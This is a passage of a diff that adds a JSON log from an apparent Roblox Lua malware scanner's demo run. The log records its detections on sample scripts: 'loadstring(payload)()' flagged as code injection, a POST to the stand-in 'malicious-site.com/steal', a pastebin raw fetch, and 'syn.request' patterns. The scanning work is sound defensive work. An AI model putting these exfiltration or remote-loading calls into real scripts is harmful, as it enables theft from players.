+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "VULN",
+      "data": {
+        "category": "CODE_INJECTION",
+        "description": "Uso de loadstring permite execução de código arbitrário e pode ser explorado para injeção de código malicioso.",
+        "detection_time": "2026-04-16T11:41:35Z",
+        "line_content": "loadstring(payload)()",
+        "line_number": 3,
+        "matched_text": "loadstring",
+        "name": "Uso de loadstring",
+        "remediation": "Evitar uso de loadstring. Usar alternativas seguras como módulos pré-compilados.",
+        "severity": "CRITICAL",
+        "source": "chain_executor.lua",
+        "vuln_id": "VULN-CI-001"
+      },
+      "id": 80,
+      "level": "WARN",
+      "message": "[VULN-CI-001] Uso de loadstring em chain_executor.lua (linha 3) - CRITICAL",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "HEURISTIC",
+      "data": {
+        "best_multiplier": 1.0,
+        "color": "🟠",
+        "combos": {},
+        "context": {
+          "adjustment": 5,
+          "code_length": 135,
+          "factors": [
+            {
+              "adjustment": 5,
+              "description": "Script pequeno com indicadores - mais suspeito",
+              "factor": "SMALL_SCRIPT"
+            }
+          ],
+          "line_count": 4
+        },
+        "indicators": {
+          "loadstring": {
+            "count": 1,
+            "points": 8,
+            "weight": 8
+          }
+        },
+        "level": "MEDIUM",
+        "score": 13,
+        "source": "chain_executor.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 81,
+      "level": "INFO",
+      "message": "🟠 Score: 13 (MEDIUM) para chain_executor.lua [1 indicadores, 0 combos]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FP_REDUCER",
+      "id": 82,
+      "level": "DEBUG",
+      "message": "Alerta aprovado: source=chain_executor.lua, score=13→13, severity=CRITICAL",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "data": {
+        "behavior": {
+          "count": 0,
+          "detections": {}
+        },
+        "code_length": 135,
+        "deobfuscation": {
+          "transformations": {},
+          "was_obfuscated": false
+        },
+        "false_positive": {
+          "alerts_passed": 1,
+          "alerts_suppressed": 0
+        },
+        "filter_matches": [
+          {
+            "line_content": "loadstring(payload)()",
+            "line_number": 3,
+            "matched_text": "loadstring",
+            "pattern": "loadstring",
+            "position": {
+              "finish": 119,
+              "start": 110
+            },
+            "severity": "HIGH",
+            "source": "chain_executor.lua",
+            "timestamp": "2026-04-16T11:41:35Z"
+          }
+        ],
+        "heuristic": {
+          "best_multiplier": 1.0,
+          "color": "🟠",
+          "combos": {},
+          "context": {
+            "adjustment": 5,
+            "code_length": 135,
+            "factors": [
+              {
+                "adjustment": 5,
+                "description": "Script pequeno com indicadores - mais suspeito",
+                "factor": "SMALL_SCRIPT"
+              }
+            ],
+            "line_count": 4
+          },
+          "indicators": {
+            "loadstring": {
+              "count": 1,
+              "points": 8,
+              "weight": 8
+            }
+          },
+          "level": "MEDIUM",
+          "score": 13,
+          "source": "chain_executor.lua",
+          "timestamp": "2026-04-16T11:41:35Z"
+        },
+        "hooks": {
+          "count": 0,
+          "patterns": {}
+        },
+        "match_count": 1,
+        "payloads": {
+          "count": 0,
+          "detections": {}
+        },
+        "signatures": {
+          "count": 0,
+          "detections": {}
+        },
+        "source": "chain_executor.lua",
+        "vulnerabilities": [
+          {
+            "category": "CODE_INJECTION",
+            "description": "Uso de loadstring permite execução de código arbitrário e pode ser explorado para injeção de código malicioso.",
+            "detection_time": "2026-04-16T11:41:35Z",
+            "line_content": "loadstring(payload)()",
+            "line_number": 3,
+            "matched_text": "loadstring",
+            "name": "Uso de loadstring",
+            "remediation": "Evitar uso de loadstring. Usar alternativas seguras como módulos pré-compilados.",
+            "severity": "CRITICAL",
+            "source": "chain_executor.lua",
+            "vuln_id": "VULN-CI-001"
+          }
+        ],
+        "vulnerability_count": 1
+      },
+      "id": 83,
+      "level": "INFO",
+      "message": "Análise concluída: 1 padrões, 1 vulns, 0 assinaturas, score 13 (MEDIUM)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "CORRELATOR",
+      "id": 84,
+      "level": "WARN",
+      "message": "8 correlações encontradas entre 7 scripts, 1 ecossistemas detectados",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "id": 85,
+      "level": "INFO",
+      "message": "Analisando código: sample_data_exfiltration.lua (305 caracteres)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "INCREMENTAL",
+      "id": 86,
+      "level": "DEBUG",
+      "message": "Cache hit: sample_data_exfiltration.lua (hash: 5d5b1a1f)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "id": 87,
+      "level": "INFO",
+      "message": "Cache hit para sample_data_exfiltration.lua - usando resultados anteriores",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "NETWORK",
+      "data": {
+        "body_size": 17,
+        "domain": "malicious-site.com",
+        "has_body": true,
+        "header_count": 0,
+        "id": 2,
+        "is_allowed": false,
+        "is_suspicious": true,
+        "method": "POST",
+        "timestamp": "2026-04-16T11:41:35Z",
+        "url": "https://malicious-site.com/steal"
+      },
+      "id": 88,
+      "level": "WARN",
+      "message": "Requisição suspeita: POST https://malicious-site.com/steal (domínio: malicious-site.com)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "NETWORK",
+      "data": {
+        "body_size": 0,
+        "domain": "pastebin.com",
+        "has_body": false,
+        "header_count": 0,
+        "id": 3,
+        "is_allowed": false,
+        "is_suspicious": true,
+        "method": "GET",
+        "timestamp": "2026-04-16T11:41:35Z",
+        "url": "https://pastebin.com/raw/abc123"
+      },
+      "id": 89,
+      "level": "WARN",
+      "message": "Requisição suspeita: GET https://pastebin.com/raw/abc123 (domínio: pastebin.com)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "name": "RemoteEvent",
+        "path": "Game.ReplicatedStorage.RemoteEvent",
+        "pattern": ".*Event.*",
+        "severity": "MEDIUM",
+        "timestamp": "2026-04-16T11:41:35Z",
+        "type": "SUSPICIOUS_REMOTE_NAME"
+      },
+      "id": 90,
+      "level": "INFO",
+      "message": "Remote com nome suspeito: 'RemoteEvent' em Game.ReplicatedStorage.RemoteEvent",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "SCANNER",
+      "data": {
+        "class": "RemoteEvent",
+        "filter_match": {
+          "name": "RemoteEvent",
+          "path": "Game.ReplicatedStorage.RemoteEvent",
+          "pattern": ".*Event.*",
+          "severity": "MEDIUM",
+          "timestamp": "2026-04-16T11:41:35Z",
+          "type": "SUSPICIOUS_REMOTE_NAME"
+        },
+        "name": "RemoteEvent",
+        "parent": "ReplicatedStorage",
+        "path": "Game.ReplicatedStorage.RemoteEvent",
+        "scan_time": "2026-04-16T11:41:35Z",
+        "suspicious": true
+      },
+      "id": 91,
+      "level": "INFO",
+      "message": "RemoteEvent encontrado: Game.ReplicatedStorage.RemoteEvent",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "name": "FireServerHandler",
+        "path": "Game.ReplicatedStorage.FireServerHandler",
+        "pattern": ".*Fire.*",
+        "severity": "MEDIUM",
+        "timestamp": "2026-04-16T11:41:35Z",
+        "type": "SUSPICIOUS_REMOTE_NAME"
+      },
+      "id": 92,
+      "level": "INFO",
+      "message": "Remote com nome suspeito: 'FireServerHandler' em Game.ReplicatedStorage.FireServerHandler",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "SCANNER",
+      "data": {
+        "class": "RemoteEvent",
+        "filter_match": {
+          "name": "FireServerHandler",
+          "path": "Game.ReplicatedStorage.FireServerHandler",
+          "pattern": ".*Fire.*",
+          "severity": "MEDIUM",
+          "timestamp": "2026-04-16T11:41:35Z",
+          "type": "SUSPICIOUS_REMOTE_NAME"
+        },
+        "name": "FireServerHandler",
+        "parent": "ReplicatedStorage",
+        "path": "Game.ReplicatedStorage.FireServerHandler",
+        "scan_time": "2026-04-16T11:41:35Z",
+        "suspicious": true
+      },
+      "id": 93,
+      "level": "INFO",
+      "message": "RemoteEvent encontrado: Game.ReplicatedStorage.FireServerHandler",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "SCANNER",
+      "data": {
+        "class": "RemoteFunction",
+        "name": "DataSync",
+        "parent": "ReplicatedStorage",
+        "path": "Game.ReplicatedStorage.DataSync",
+        "scan_time": "2026-04-16T11:41:35Z"
+      },
+      "id": 94,
+      "level": "INFO",
+      "message": "RemoteFunction encontrada: Game.ReplicatedStorage.DataSync",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "line_content": "local HttpService = game:GetService(\"HttpService\")",
+        "line_number": 1,
+        "matched_text": "game:GetService(\"HttpService\")",
+        "pattern": "game:GetService%(\"HttpService\"%)",
+        "position": {
+          "finish": 58,
+          "start": 29
+        },
+        "severity": "LOW",
+        "source": "Game.Workspace.GameScript",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 95,
+      "level": "WARN",
+      "message": "Padrão suspeito encontrado: 'game:GetService(\"HttpService\")' em Game.Workspace.GameScript (linha 1) [LOW]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "line_content": "local response = syn.request({",
+        "line_number": 3,
+        "matched_text": "syn.request",
+        "pattern": "syn%.request",
+        "position": {
+          "finish": 181,
+          "start": 171
+        },
+        "severity": "HIGH",
+        "source": "Game.Workspace.GameScript",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 96,
+      "level": "WARN",
+      "message": "Padrão suspeito encontrado: 'syn.request' em Game.Workspace.GameScript (linha 3) [HIGH]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "line_content": "local response = syn.request({",
+        "line_number": 3,
+        "matched_text": "request",
+        "pattern": "request",
+        "position": {
+          "finish": 181,
+          "start": 175
+        },
+        "severity": "LOW",
+        "source": "Game.Workspace.GameScript",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 97,
+      "level": "WARN",
+      "message": "Padrão suspeito encontrado: 'request' em Game.Workspace.GameScript (linha 3) [LOW]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "SCANNER",
+      "data": {
+        "matches": 3,
+        "path": "Game.Workspace.GameScript"
+      },
+      "id": 98,
+      "level": "WARN",
+      "message": "Script com 3 padrões suspeitos: Game.Workspace.GameScript",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "SCANNER",
+      "id": 99,
+      "level": "DEBUG",
+      "message": "Script analisado: Game.Workspace.GameScript [Script] (source: true)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "VULN_DETECTOR",
+      "id": 100,
+      "level": "INFO",
+      "message": "Iniciando análise de vulnerabilidades nos resultados do scan",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "VULN",
+      "data": {
+        "category": "DATA_EXFILTRATION",
+        "description": "Requisições HTTP para domínios não-Roblox podem indicar exfiltração de dados.",
+        "detection_time": "2026-04-16T11:41:35Z",
+        "line_content": "local response = syn.request({",
+        "line_number": 3,
+        "matched_text": "syn.request",
+        "name": "Requisição HTTP para domínio externo",
+        "remediation": "Bloquear requisições para domínios não autorizados. Usar whitelist de domínios.",
+        "severity": "HIGH",
+        "source": "Game.Workspace.GameScript",
+        "vuln_id": "VULN-DE-001"
+      },
+      "id": 101,
+      "level": "WARN",
+      "message": "[VULN-DE-001] Requisição HTTP para domínio externo em Game.Workspace.GameScript (linha 3) - HIGH",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "VULN_DETECTOR",
+      "data": {
+        "by_category": {
+          "AUTHENTICATION_BYPASS": 1,
+          "CODE_INJECTION": 3,
+          "DATA_EXFILTRATION": 4,
+          "MEMORY_MANIPULATION": 2,
+          "PRIVILEGE_ESCALATION": 1
+        },
+        "by_severity": {
+          "CRITICAL": 5,
+          "HIGH": 6,
+          "LOW": 0,
+          "MEDIUM": 2
+        },
+        "total_detected": 13
+      },
+      "id": 102,
+      "level": "INFO",
+      "message": "Análise concluída: 13 vulnerabilidades detectadas",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "INTEGRITY",
+      "id": 103,
+      "level": "INFO",
+      "message": "Verificação de integridade OK - todos os módulos íntegros",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "PERF",
+      "id": 104,
+      "level": "INFO",
+      "message": "=== Performance Summary ===",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "PERF",
+      "id": 105,
+      "level": "INFO",
+      "message": "  scan_code:sample_code_injection.lua: 1 exec, avg 0.0007s, min 0.0007s, max 0.0007s, total 0.0007s",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "PERF",
+      "id": 106,
+      "level": "INFO",
+      "message": "  demo_total: 1 exec, avg 0.0065s, min 0.0065s, max 0.0065s, total 0.0065s",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "PERF",
+      "id": 107,
+      "level": "INFO",
+      "message": "  scan_code:sample_data_exfiltration.lua: 2 exec, avg 0.0003s, min 0.0001s, max 0.0006s, total 0.0006s",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "PERF",
+      "id": 108,
+      "level": "INFO",
+      "message": "  scan_code:chain_executor.lua: 1 exec, avg 0.0005s, min 0.0005s, max 0.0005s, total 0.0005s",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "PERF",
+      "id": 109,
+      "level": "INFO",
+      "message": "  scan_code:sample_metatable_hook.lua: 1 exec, avg 0.0009s, min 0.0009s, max 0.0009s, total 0.0009s",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "PERF",
+      "id": 110,
+      "level": "INFO",
+      "message": "  scan_code:sample_safe_code.lua: 1 exec, avg 0.0015s, min 0.0015s, max 0.0015s, total 0.0015s",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "PERF",
+      "id": 111,
+      "level": "INFO",
+      "message": "  scan_code:sample_obfuscated.lua: 1 exec, avg 0.0008s, min 0.0008s, max 0.0008s, total 0.0008s",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "PERF",
+      "id": 112,
+      "level": "INFO",
+      "message": "  scan_code:chain_downloader.lua: 1 exec, avg 0.0006s, min 0.0006s, max 0.0006s, total 0.0006s",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "PERF",
+      "id": 113,
+      "level": "INFO",
+      "message": "========================",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    }
+  ],
+  "metadata": {
+    "log_level": "DEBUG",
+    "scanner_version": "1.0.0",
+    "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+    "start_time": "2026-04-16T11:41:35Z"
+  },
+  "total_entries": 113
+}
